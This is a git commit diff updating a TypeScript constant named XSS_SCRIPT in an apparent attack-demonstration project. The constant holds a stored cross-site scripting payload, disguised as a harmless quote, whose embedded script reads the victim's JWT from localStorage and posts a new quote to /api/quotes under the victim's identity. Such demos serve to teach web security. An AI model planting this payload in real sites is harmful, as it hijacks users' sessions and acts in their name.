87f78a2f6f12cbc4edc9331817a0d169d9782829
Bishram <m.bishram.yashir@gmail.com>
2022-08-07 18:30:49 +0800

    Update xss script

--- src/libs/attacks/xss.ts
+++ src/libs/attacks/xss.ts
@@ -1,9 +1,5 @@
 export const XSS_SCRIPT = `Seemingly harmless quote! Lorem ipsum dolor sit amet, consectetur adipisicing elit. Fugit, quasi.
 <script>
-	// Get token from localStorage
-  const jwtToken = localStorage.getItem("JWT_ACCESS_TOKEN_KEY");
-  
-  // Still fetch if not found, it will try to use cookies
 	fetch("/api/quotes", {
 		method: "POST",
 		body: JSON.stringify({
@@ -13,7 +9,7 @@ export const XSS_SCRIPT = `Seemingly harmless quote! Lorem ipsum dolor sit amet,
 				"XSS Attack! Lorem ipsum dolor sit amet, consectetur adipisicing elit. Ad aliquid aperiam beatae corporis delectus, dolorum inventore nihil quas quod rem sapiente suscipit velit! Commodi, cupiditate ipsa itaque magnam maxime quam?",
 		}),
 		headers: {
-			authorization: jwtToken && "Bearer " + jwtToken,
+			authorization: localStorage.getItem("JWT_ACCESS_TOKEN_KEY") && "Bearer " + localStorage.getItem("JWT_ACCESS_TOKEN_KEY"), // Get token from localStorage
 		},
 	}).then((res) => console.log(res.json()));
 </script>`;
